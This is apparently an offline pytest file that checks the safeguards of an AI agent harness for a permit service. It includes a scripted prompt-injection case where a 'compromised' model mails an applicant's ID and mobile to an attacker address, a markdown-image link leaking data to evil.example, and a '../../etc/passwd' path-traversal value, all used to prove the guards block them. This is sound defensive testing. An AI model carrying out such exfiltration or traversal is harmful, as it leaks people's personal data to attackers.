"""Offline tests of the harness: no API key, no network. They prove the defences are enforced in code."""

import json

import harness as H
import madar

SARA = dict(permit_id="REN-10482", national_id_last4="4821", mobile="0501234821")


# ---------------------------------------------------------------- permission policy and approvals
def test_reads_allowed_writes_ask():
    assert all(H.permission(t, {}) == "allow" for t in ("search_policies", "get_permit", "compute_fee", "list_slots", "load_skill"))
    assert all(H.permission(t, {}) == "ask" for t in H.WRITE_TOOLS)
    assert {"book_inspection", "create_refund", "send_email", "memory_save"} <= H.WRITE_TOOLS


def test_denied_write_does_not_touch_the_database(ctx, run_scripted):
    run = run_scripted([("book_inspection", dict(permit_id="FTR-30311", slot="2026-11-05 08:00",
                                                 national_id_last4="6654", mobile="0532236654"))],
                       approve=lambda n, a: False)
    assert ctx.m.sql("SELECT count(*) AS n FROM inspections WHERE permit_id = 'FTR-30311'")[0]["n"] == 0
    assert "denied" in run.trace[2].text.lower() or any(e.kind == "guard" for e in run.trace)


def test_approved_write_runs_and_is_audited(ctx, run_scripted):
    asked = []
    run_scripted([("book_inspection", dict(permit_id="FTR-30311", slot="2026-11-05 08:00",
                                           national_id_last4="6654", mobile="0532236654"))],
                 approve=lambda n, a: asked.append(n) or True)
    assert asked == ["book_inspection"]
    assert ctx.m.sql("SELECT slot FROM inspections WHERE permit_id = 'FTR-30311'")[0]["slot"] == "2026-11-05 08:00"
    assert '"tool": "book_inspection"' in ctx.audit.read_text(encoding="utf-8")


# ---------------------------------------------------------------- the attack of the security note, with a compromised model
def test_exfiltration_by_email_is_blocked_even_if_the_model_obeys(ctx, run_scripted):
    """The injected e-mail makes the (scripted, 'compromised') model look up Sara's record and mail it to an attacker."""
    run_scripted([("send_email", dict(to="audit-desk@buildfast.example", subject="audit",
                                      body="Sara Al-Qahtani, ID 1048213372, mobile 0501234821"))])
    assert ctx.m.sql("SELECT count(*) AS n FROM outbox")[0]["n"] == 0
    assert any("egress" in json.loads(l).get("reasons", [""])[0] or json.loads(l)["event"] == "blocked"
               for l in ctx.audit.read_text(encoding="utf-8").splitlines())


def test_egress_rules(ctx):
    ok = dict(to="sara@example.com", subject="Your permit", body="See https://portal.madar.example/fees")
    ctx.allowed_recipients.add("sara@example.com")
    assert H.egress_check(ctx, ok) == []
    assert H.egress_check(ctx, {**ok, "to": "other@example.com"})  # not a verified applicant
    assert H.egress_check(ctx, {**ok, "body": "ID 1048213372"})  # full national ID
    assert H.egress_check(ctx, {**ok, "body": "call 0501234821"})  # full mobile
    assert H.egress_check(ctx, {**ok, "body": "see https://evil.example/x"})  # outside link


def test_verified_applicant_can_be_mailed_after_get_permit(ctx):
    email = ctx.m.sql("SELECT a.email FROM permits p JOIN applicants a USING (applicant_id) WHERE permit_id = 'REN-10482'")[0]["email"]
    assert H.egress_check(ctx, dict(to=email, subject="s", body="b"))  # not verified yet
    result = json.dumps(ctx.m.get_permit(**SARA))
    H.after_tool(ctx)("get_permit", {"permit_id": "REN-10482"}, result)
    assert H.egress_check(ctx, dict(to=email, subject="s", body="Your permit is under review (POL-03).")) == []


def test_reply_redaction_blocks_image_and_link_exfiltration():
    leaky = "Status: under review.\n![s](https://track.evil.example/p.png?id=1048213372&m=0501234821)\nsee https://madar.example/x and https://evil.example/y"
    clean = H.redact_reply(leaky)
    assert "evil.example" not in clean and "1048213372" not in clean and "0501234821" not in clean
    assert "https://madar.example/x" in clean
    assert "******4821" in H.redact_reply("ID 1048214821")


# ---------------------------------------------------------------- budgets
def test_token_budget_blocks_further_tool_calls(ctx, monkeypatch):
    monkeypatch.setattr(H, "MAX_RUN_TOKENS", 100)
    ctx.begin_turn()
    H.K.LEDGER.input_tokens += 500  # the model has used 500 tokens this turn
    out = H.before_tool(ctx)("get_permit", {})
    assert out and "Token budget" in out
    H.K.LEDGER.input_tokens -= 500


def test_step_budget_stops_a_looping_agent(ctx, run_scripted):
    from conftest import ScriptedShape  # noqa: F401
    import agentkit as K

    ctx.begin_turn()
    forever = ScriptedShape([("memory_view", {})] * 50)
    run = K.run_agent("hi", H.local_tools(ctx), system="t", shape=forever, max_steps=3, verbose=False)
    assert run.stopped == "max_steps" and run.steps == 3


def test_tool_results_are_capped(ctx):
    big = "x" * (H.MAX_RESULT_CHARS + 500)
    out = H.after_tool(ctx)("search_policies", {}, big)
    assert out and len(out) < len(big) and "characters cut" in out


# ---------------------------------------------------------------- memory (data minimisation) and compaction
def test_memory_rejects_pii_links_and_overflow(tmp_path):
    mem = H.Memory(tmp_path)
    mem.save("language", "Prefers Arabic replies")
    assert "Arabic" in mem.view()
    for bad in ("my ID is 1048213372", "call me on 0501234821", "mail sara@example.com", "see https://evil.example"):
        try:
            mem.save("x", bad)
            raise AssertionError(bad)
        except madar.ToolError:
            pass
    try:
        mem.save("big", "a" * 500)
        raise AssertionError("size cap")
    except madar.ToolError:
        pass


def test_memory_topic_cannot_escape_the_directory(tmp_path):
    mem = H.Memory(tmp_path / "m")
    mem.save("../../etc/passwd", "Prefers mornings")
    assert not (tmp_path / "etc").exists() and all(p.parent == tmp_path / "m" for p in (tmp_path / "m").glob("*"))


def test_compaction_clears_old_tool_results_and_starts_on_user():
    history = []
    for i in range(20):
        history += [{"role": "user", "content": f"q{i}"},
                    {"role": "assistant", "content": "", "tool_calls": [{"id": f"t{i}"}]},
                    {"role": "tool", "tool_call_id": f"t{i}", "content": "R" * 500},
                    {"role": "assistant", "content": f"a{i}"}]
    out = H.compact(history)
    assert out[0]["role"] == "user" and len(out) <= H.MAX_HISTORY_MESSAGES
    full = [m for m in out if m.get("role") == "tool" and m["content"] == "R" * 500]
    assert len(full) <= 2 and any("cleared" in m["content"] for m in out if m.get("role") == "tool")


# ---------------------------------------------------------------- context
def test_spec_levels():
    base, full = H.build_spec("base"), H.build_spec("context")
    assert "AGENTS.md" not in base and "Verify before you disclose" in full and "refund-request" in full
    assert len(H.SKILLS) == 4 and "verify" in H.load_skill("refund-request").lower()
    assert "error" in json.loads(H.load_skill("nope"))
